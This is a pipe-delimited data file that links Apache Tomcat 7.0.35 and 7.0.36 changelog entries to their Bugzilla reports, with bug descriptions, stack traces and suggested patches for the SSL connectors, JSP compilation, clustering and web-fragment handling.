This security issue is flagged for Tomcat during PCI compliance scan."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54324
Coyote|Tomcat 7.0.36 (markt)|fix|54406|Fix NIO HTTPS connector to prune specified  ciphers and sslEnableProtocols options to those supported by the SSL implementation, sharing logic with the BIO connector. Modified ciphers and sslEnabledProtocols option pruning to not silently revert to JVM defaults when none of the options specified are supported - new behaviour is to warn and explicitly enable no options. (timw)|NIO and BIO connectors handle unsupported SSL ciphers and sslEnabledProtocols differently|"The NIO and BIO connectors share (most of) a JSSE based SSLImplementation, but differ in their handling of the ciphers and sslEnabledProtocols attributes.

The NIO connector sets the configured values for both attributes directly on the SSLEngine, which will fail immediately if any of them are unsupported. This makes creating a portable/superset collection of ciphers impossible - i.e. IBM JDKs do not support many of the cipher suite names used by JSSE and vice versa (usually TLS_ vs SSL_ prefixes differ) and the supported options differ between Java 6/7 etc.

The BIO connector attempts to filter the specified values down to those supported by the SSL implementation, but has issues as well: if none of the specified ciphers/protocols are supported it will silently use the defaults of the SSL implementation, which can lead to unexpectedly (and unwittingly) insecure configurations.

I propose to:
 - modify the NIO connector to use the same logic as the BIO connector to filter requested ciphers/protocols to supported values (by placing these operations on the SSLUtil interface). 
 - modify the ciphers/protocols filtering logic to treat an explicit list of unsupported options as setting no supported ciphers/protocols and warn when this is done (it will also fail visibly with errors if SSL connections are attempted)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54406
Coyote|Tomcat 7.0.36 (markt)|fix||Align NIO HTTP connector with other HTTP connectors and include leading blank lines when determining the size of the HTTP headers. (markt)|||
Jasper|Tomcat 7.0.36 (markt)|fix|53869|Performance improvement for pages with lots of heavily nested tags. Retain a reference to the root JSP context rather than traversing the hierarchy on every call. Based on a patch suggested by Sheldon Shao. (markt)|Performance tuning solution to resolve too many cascaded JspContextWrapper issue|"Created attachment 29372 [details]
Patch for JspContextWrapper.java

JspContextWrapper.getServletContext, JspContextWrapper.findAttribute and JspContextWrapper.getELContext take much time because there are many cascaded tag files. 

For example:
 <tag1>
 <tag2>
 <tag3>
 <tag4/>
 </tag3>
 </tag2>
 </tag1>

When calling JspContextWrapper(tag4).getServletContext from tag4, it will call JspContextWrapper(tag3).getServletContext --> JspContextWrapper(tag2).getServletContext --> JspContextWrapper(tag1).getServletContext --> PageContext.getServletContext.

If the root PageContext can be held in JspConextWrapper, those page,session,application scopes calling can go directy to this root PageContext.

Please check out the attached diff file (JspContextWrapper.diff) to get more detail about this change."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53869
Jasper|Tomcat 7.0.36 (markt)|fix|54440|Correct a regression caused by the changes for 54240 that broke compilation of JSPs with JspC. Patch provided by Sheldon Shao. (markt)|TagPluginManager.init() throws NPE when used in Ant <jasper> task|"In 7.0.35, I see the following NPE when compiling JSPX files via the <jasper> Ant task:

   [jasper] java.lang.NullPointerException
   [jasper] 	at org.apache.jasper.compiler.TagPluginManager.init(TagPluginManager.java:83)
   [jasper] 	at org.apache.jasper.compiler.TagPluginManager.apply(TagPluginManager.java:57)
   [jasper] 	at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:240)
   [jasper] 	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
   [jasper] 	at org.apache.jasper.JspC.processFile(JspC.java:1179)
   [jasper] 	at org.apache.jasper.JspC.execute(JspC.java:1329)
   [jasper] 	at org.apache.tools.ant.UnknownElement.execute(UnknownElement.java:291)
   [jasper] 	at sun.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
   [jasper] 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
   [jasper] 	at java.lang.reflect.Method.invoke(Method.java:601)
   [jasper] 	at org.apache.tools.ant.dispatch.DispatchUtils.execute(DispatchUtils.java:106)
   [jasper] 	at org.apache.tools.ant.Task.perform(Task.java:348)
   [jasper] 	at org.apache.tools.ant.Target.execute(Target.java:390)
   [jasper] 	at org.apache.tools.ant.Target.performTasks(Target.java:411)
   [jasper] 	at org.apache.tools.ant.Project.executeSortedTargets(Project.java:1399)
   [jasper] 	at org.apache.tools.ant.Project.executeTarget(Project.java:1368)
   [jasper] 	at org.apache.tools.ant.helper.DefaultExecutor.executeTargets(DefaultExecutor.java:41)
   [jasper] 	at org.apache.tools.ant.Project.executeTargets(Project.java:1251)
   [jasper] 	at org.apache.tools.ant.Main.runBuild(Main.java:809)
   [jasper] 	at org.apache.tools.ant.Main.startAnt(Main.java:217)
   [jasper] 	at org.apache.tools.ant.launch.Launcher.run(Launcher.java:280)
   [jasper] 	at org.apache.tools.ant.launch.Launcher.main(Launcher.java:109)

This didn't happen in 7.0.34.

Given the line and change from 7.0.34 (http://svn.apache.org/viewvc/tomcat/tc7.0.x/trunk/java/org/apache/jasper/compiler/TagPluginManager.java?r1=1402119&r2=1431228&diff_format=h) I assume that in...

    urls = ctxt.getClassLoader().getResources(
84	 	                     META_INF_JASPER_TAG_PLUGINS_XML);

the ClassLoader is null, since ctxt was used here before and evidently not null.

Fall back to Thread.currentThread().getContextClassLoader() in this case?


My Ant snippet:

    <import file=""${tomcat.home}/bin/catalina-tasks.xml""/>
    ...
    <jasper validateXml=""false""
            failonerror=""true""
            listerrors=""true""
            trimspaces=""true""
            uriroot=""${module.web.basedir}/docs""
            outputDir=""${module.web.basedir}/gen""
            package=""*****""
            xpoweredBy=""false""/>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54440
Jasper|Tomcat 7.0.36 (markt)|fix|54466|Improve error message by including the name of the file when the java file generated from a tag file cannot be compiled. Based on a patch by Sheldon Shao. (markt)|No file name information in detail error when compiling the java file generated from a tag file|"Created attachment 29879 [details]
Patch for DefaultErrorHandler

org.apache.jasper.JasperException: Unable to compile class for JSP: 

An error occurred at line: 634 in the generated java file
Syntax error, insert ""}"" to complete Statement

An error occurred at line: 644 in the generated java file
Syntax error on tokens, delete these tokens

Stacktrace:
    at org.apache.jasper.compiler.DefaultErrorHandler.javacError(DefaultErrorHandler.java:102)
    at org.apache.jasper.compiler.ErrorDispatcher.javacError(ErrorDispatcher.java:331)
    at org.apache.jasper.compiler.JDTCompiler.generateClass(JDTCompiler.java:473)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:378)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
    at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
    at org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:240)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:578)
    at org.apache.jasper.compiler.TagFileProcessor.access$0(TagFileProcessor.java:518)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:655)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:659)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:659)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2434)
    at org.apache.jasper.compiler.Node$Root.accept(Node.java:475)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:673)
    at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:229)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
    at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
    at org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:240)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:578)
    at org.apache.jasper.compiler.TagFileProcessor.access$0(TagFileProcessor.java:518)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:655)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2434)
    at org.apache.jasper.compiler.Node$Root.accept(Node.java:475)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:673)
    at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:229)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
    at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
    at org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:240)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:578)
    at org.apache.jasper.compiler.TagFileProcessor.access$0(TagFileProcessor.java:518)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:655)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:659)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:659)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2434)
    at org.apache.jasper.compiler.Node$Root.accept(Node.java:475)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:673)
    at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:229)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
    at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
    at org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:240)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:578)
    at org.apache.jasper.compiler.TagFileProcessor.access$0(TagFileProcessor.java:518)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:655)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:659)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:659)
    at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1539)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2428)
    at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2434)
    at org.apache.jasper.compiler.Node$Root.accept(Node.java:475)
    at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2376)
    at org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:673)
    at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:229)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
    at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
    at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:668)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:684)
    at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:593)
    at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:530)
    at com.ebay.raptor.web.JspPrecompileCommand.execute(JspPrecompileCommand.java:112)
    at com.ebay.raptor.web.JspPrecompileCommand.execute(JspPrecompileCommand.java:85)
    at com.ebay.raptor.web.RaptorFrontController.doPost(RaptorFrontController.java:216)
    at com.ebay.raptor.web.RaptorFrontController.doGet(RaptorFrontController.java:96)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:575)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:668)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
    at org.apache.geronimo.tomcat.GeronimoStandardContext$SystemMethodValve.invoke(GeronimoStandardContext.java:731)
    at org.apache.geronimo.tomcat.valve.GeronimoBeforeAfterValve.invoke(GeronimoBeforeAfterValve.java:48)
    at org.apache.geronimo.tomcat.valve.ProtectedTargetValve.invoke(ProtectedTargetValve.java:53)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at com.ebay.raptor.valve.RaptorDispatchValve.invoke(RaptorDispatchValve.java:53)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:999)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:565)
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1620)
    at org.apache.geronimo.pool.ThreadPool$1.run(ThreadPool.java:267)
    at org.apache.geronimo.pool.ThreadPool$ContextClassLoaderRunnable.run(ThreadPool.java:397)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:897)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:919)
    at java.lang.Thread.run(Thread.java:736)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54466
Cluster|Tomcat 7.0.36 (markt)|fix||Fix incorrect increment of counterSend_EVT_SESSION_EXPIRED and counterSend_EVT_CHANGE_SESSION_ID. These values are not incremented if no members active in cluster group. (kfujino)|||
Cluster|Tomcat 7.0.36 (markt)|fix|54476|Correct error in Javadoc of GroupChannel send methods to maker clear that the minimum length of the destination member array is one, not two. (markt)|incorrect param specification in javadoc ...tribes.group.GroupChannel send methods|"* @param destination Member[] - destination.length > 1

I believe this should be:

    * @param destination Member[] - destination.length > 0"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54476
Cluster|Tomcat 7.0.36 (markt)|fix||Prevent SSO deregister when node shutdown normally in cluster environment. (kfujino)|||
Cluster|Tomcat 7.0.36 (markt)|fix||Check cluster member before sending replicate message in ClusterSingleSignOn. (kfujino)|||
Web applications|Tomcat 7.0.36 (markt)|fix|54461|Improve the documentation for the compiler attribute in the Jasper how-to. (markt)|"JSP compiler init parameter documented as ""compiler"", actually ""compilerClassName"""|"This bug exists in Tomcat 6, Tomcat 7 and (presumably) Tomcat 8 (trunk).

See the documentation for JSP compilation:

http://tomcat.apache.org/tomcat-6.0-doc/jasper-howto.html
http://tomcat.apache.org/tomcat-7.0-doc/jasper-howto.html

There's a configuration option listed in this documentation:

compiler - Which compiler Ant should use to compile JSP pages. See the Ant documentation for more information. If the value is not set, then the default Eclipse JDT Java compiler will be used instead of using Ant. No default value.

This does not exist. Creating an init-param with this value has no effect. The correct init-param is ""compilerClassName,"" not ""compiler.""

Related, this option is very poorly documented. There is no indication about what this value should be. Tried com.sun.tools.javac.Main and added tools.jar to the classpath, but got a class cast exception. It would be nice if this explained what the proper alternative values are."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54461
Web applications|Tomcat 7.0.36 (markt)|add||Add Jespa to the list of third-party Windows authentication providers and make external links in the documentation for those providers no-follow. (markt)|||
Tribes|Tomcat 7.0.36 (markt)|fix|54496|Don't use a hard-coded class name in MemberImpl.toString(). (markt)|..tribes.membership.MemberImpl.toString() might be better using .getClass().getName()|"public String toString()  {
 StringBuilder buf = new  
 StringBuilder(""org.apache.catalina.tribes.membership.MemberImpl["");

Might be better to use .getClass().getName() to cover StaticMember and any other sub-classes that might arise."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54496
Other|Tomcat 7.0.36 (markt)|update||Update to Apache Commons Daemon 1.0.12. (markt)|||
Catalina|Tomcat 7.0.35 (markt)|fix|54247|Prevent ClassNotFoundExceptions on stop when running as a service. (markt)|Exception in JmxRemoteLifecycleListener.destroyServer|"Created attachment 29697 [details]
Tomcat log (first stop with service manager, second stop with shutdown port)

Tomcat 7.0.33 is installed as Windows service and is using JDK 1.7.0_09.
JmxRemoteLifecycleListener is used :
<Listener className=""org.apache.catalina.mbeans.JmxRemoteLifecycleListener"" 
		rmiRegistryPortPlatform=""8999"" rmiServerPortPlatform=""9999"" />

When Tomcat is stopped through the Windows service manager or the Common Daemon Service Manager, the JmxRemoteLifecycleListener listener fail to stop with the following exception :

05-Dec-2012 10:44:49.306 SEVERE [Thread-36] org.apache.catalina.mbeans.JmxRemoteLifecycleListener.destroyServer The JMX connector server could not be stopped for the Platform server
 java.io.IOException: Cannot bind to URL: javax.naming.NoInitialContextException: Cannot instantiate class: org.apache.naming.java.javaURLContextFactory [Root exception is java.lang.ClassNotFoundException: org/apache/naming/java/javaURLContextFactory]
	at javax.management.remote.rmi.RMIConnectorServer.newIOException(RMIConnectorServer.java:826)
	at javax.management.remote.rmi.RMIConnectorServer.stop(RMIConnectorServer.java:569)
	at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.destroyServer(JmxRemoteLifecycleListener.java:282)
	at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.lifecycleEvent(JmxRemoteLifecycleListener.java:226)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:347)
	at org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:748)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	at org.apache.catalina.startup.Catalina.stopServer(Catalina.java:486)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at org.apache.catalina.startup.Bootstrap.stopServer(Bootstrap.java:371)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:453)
Caused by: javax.naming.NoInitialContextException: Cannot instantiate class: org.apache.naming.java.javaURLContextFactory [Root exception is java.lang.ClassNotFoundException: org/apache/naming/java/javaURLContextFactory]
	at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:674)
	at javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:307)
	at javax.naming.InitialContext.init(InitialContext.java:242)
	at javax.naming.InitialContext.<init>(InitialContext.java:216)
	at javax.management.remote.rmi.RMIConnectorServer.stop(RMIConnectorServer.java:558)
	... 15 more
Caused by: java.lang.ClassNotFoundException: org/apache/naming/java/javaURLContextFactory
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:264)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:63)
	at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:671)
	... 19 more

If Tomcat is stopped through the use of the shutdown port, the JmxRemoteLifecycleListener listener stop gently."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54247
Catalina|Tomcat 7.0.35 (markt)|fix|54249|Ensure resource properties are available when the context path contains encoded characters such as a space. This triggered compilation issues in Jasper. Patch provided by Polina Genova. (markt)|Fix JSP compilation problem when application context root contains white spaces|"Created attachment 29698 [details]
Test web application.

Hello, 

I noticed that there is a jsp compilation problem when the application context root contains white spaces.

Steps to reproduce:
Deploy the attached application and request:
http://<host>:<port>/Space%20AppTest/testClassInvoker.jsp

Then the following exception is received in response:

org.apache.jasper.JasperException: Unable to compile class for JSP
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:661)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
root cause 
java.lang.IllegalArgumentException: Negative time
	java.io.File.setLastModified(File.java:1258)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:376)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:646)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)

I would like to propose a small patch that fixes this. The fix simply moves the decoding in org.apache.naming.resources.DirContextURLConnection.connect() method a little bit earlier.
Without the fix path.startsWith(contextPath + ""/"") check returns false in our case, as contexPath is in decoded form, while path is not decoded yet.

Thanks and Best Regards,
Polina"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54249
Catalina|Tomcat 7.0.35 (markt)|fix|54256|Improve error reporting when a JAR file fails extension validation by including the name of the JAR file in the exception. (markt)|Enhance Exception reporting on JAR file error|"(I posted this to the mailing list on Oct 28, 2011, but didn't end up creating a report on it until now.  I have the same error with Tomcat 7.)

PROBLEM DESCRIPTION:

I have an exception (appended below), and I think it would be nice to have more information about what is going on.

If I had more context, it would help me find the cause of my problem much more quickly.  For example, if the exception indicated what the file/resource that was having the problem was, it would speed up troubleshooting immensely.

HOW TO REPRODUCE:

In a JAR file contained in WAR file's WEB-INF/lib folder:  Change the MANIFEST.MF file in the JAR file.  Put in a line with ONLY ""Class-Path:"".  Note there is no space after the period, which is what causes the error.  During load of the application, the exception which I have appended at the end of this message will show up.

SUGGESTED IMPROVEMENT:

My suggestion would be to modify ExtensionValidator.validateApplication(...), around line 195.  This is the location that actually knows about what the resource is.  It would be nice if the IOException was caught, and information about the Resource was added to the exception, probably by wrapping the exception.

Because I have not gone through the overhead of getting a version of Tomcat running from source, these changes have not been compiled and tested, but I think the suggestion is relatively straight-forward.

Here are the suggested code changes:

First code change - move the definition of ""resource"" outside of the try/catch:

         // Locate the Manifests for all bundled JARs
         Resource resource = null; // ADDED
         NamingEnumeration<Binding> ne = null;

Second code change - make the existing declaration of ""resource"" just an assignment:

                 resource = (Resource) obj; // MODIFIED
                 inputStream = resource.streamContent();
                 Manifest jmanifest = getManifest(inputStream);

Third code change: add a catch clause and re-throw:

         } catch (NamingException nex) {
             // Jump out of the check for this application because it
             // has no resources
         } catch (IOException ioex) { // ADDED
             throw new IOException(""validation problem in "" + resource.toString(), ioex); // ADDED
         } finally {

The problem is that the resource may not have a proper toString().  I would suggest changing FileDirContext:898 (inner class=FileResource) to have a toString method, something along the lines of:

         public String toString() { // ADDED
             return file == null ? ""null"" : file.toString(); // ADDED
         } // ADDED

Note: about this, in the original email thread, Konstantin Kolinko said:
""Not sure about FileResource.toString(), but adding a catch for IOException looks like doable.""


Finally, here's the exception:

28-Oct-2011 11:03:03 AM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error in dependencyCheck
java.io.IOException: invalid header field
     at java.util.jar.Attributes.read(Attributes.java:410)
     at java.util.jar.Manifest.read(Manifest.java:199)
     at java.util.jar.JarInputStream.<init>(JarInputStream.java:83)
     at java.util.jar.JarInputStream.<init>(JarInputStream.java:60)
     at org.apache.catalina.util.ExtensionValidator.getManifest(ExtensionValidator.java:394)
     at org.apache.catalina.util.ExtensionValidator.validateApplication(ExtensionValidator.java:195)
     at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5037)
     at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:148)
     at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1033)
     at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:774)
     at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:148)
     at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1033)
     at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:291)
     at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:148)
     at org.apache.catalina.core.StandardService.startInternal(StandardService.java:443)
     at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:148)
     at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:727)
     at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:148)
     at org.apache.catalina.startup.Catalina.start(Catalina.java:621)
     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
     at java.lang.reflect.Method.invoke(Method.java:616)
     at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322)
     at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:450)

(And if only java.util.jar.Attributes.read reported WHICH attribute had the problem, we'd really be in business.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54256
Catalina|Tomcat 7.0.35 (markt)|fix||Allow web applications to be stopped cleanly even if filters throw exceptions when their destroy() method is called. (markt/kkolinko)|||
Catalina|Tomcat 7.0.35 (markt)|fix||Fix memory leak of servlet instances when running with a SecurityManager and either init() or destroy() methods fail or the servlet is a SingleThreadModel one. (kkolinko)|||
Catalina|Tomcat 7.0.35 (markt)|code||Cleanup method cache lookup code in SecurityUtil class. (kkolinko)|||
Catalina|Tomcat 7.0.35 (markt)|add||Make the Tomcat 7 non-JSR356 WebSocket implementation non-blocking (where supported by the connector) between the HTTP upgrade and the first WebSocket message from the client to the server. (markt)|||
Catalina|Tomcat 7.0.35 (markt)|fix|54262|Ensure that an empty <absolute-ordering /> element in the main web.xml file disables scanning for web fragments. Based on a patch by Violeta Georgieva. (markt)|An empty <absolute-ordering /> should turn off all web-fragments|"The use of an <absolute-ordering> element does disable ServletContainerInitializer classpath scanning as discussed also in issue 53619. However, it does seem to require having at least one web-fragment name to be listed. In other words I would this:

<absolute-ordering />

To turn off all web-fragments since none are named. A workaround is to list a web-fragment even if it doesn't exist but that shouldn't be necessary."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54262
Catalina|Tomcat 7.0.35 (markt)|fix|54284|As per clarification from the Servlet EG, anonymous Filters and Servlets are not permitted. Patch by Violeta Georgieva. (markt)|Util.objectNameValueNeedsQuote throws NPE for anonymous Filters|"How to reproduce?

From inside the contextInitialized-Method of an ServletContextListener instance, call

context.addFilter(null,
      new ArbitraryFilter(pathPrefix)).addMappingForUrlPatterns(null, false, pathPrefix);

What happens?

Dec 12, 2012 3:59:03 PM org.apache.catalina.core.StandardContext filterStart
SEVERE: Exception starting filter null
java.lang.NullPointerException
        at org.apache.tomcat.util.modeler.Util.objectNameValueNeedsQuote(Util.java:26)
